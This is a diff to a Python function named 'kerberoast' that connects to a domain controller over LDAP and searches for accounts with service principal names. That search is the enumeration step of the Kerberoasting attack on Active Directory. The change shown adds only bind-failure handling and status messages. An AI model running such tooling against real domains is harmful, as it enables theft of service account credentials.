@@ -7,6 +7,12 @@ def kerberoast(username, password, domain, dc_ip):
         conn = Connection(server, user=f"{domain}\\{username}", password=password, authentication='NTLM')
         conn.bind()
 
+        if not conn.bound:
+            print(f"Failed to bind to LDAP server {dc_ip}")
+            return
+
+        print(f"Successfully connected to LDAP server {dc_ip}")
+
         # Search for users with SPNs set
         conn.search(search_base="DC=" + ",".join(domain.split(".")),
                     search_filter="(servicePrincipalName=*)",
@@ -31,6 +37,7 @@ def kerberoast(username, password, domain, dc_ip):
 
     except Exception as e:
         print(f"Error while Kerberoasting: {e}")
+
 
 # Example usage:
 # Replace "username", "password", "domain", and "dc_ip" with your actual credentials and domain controller's IP address
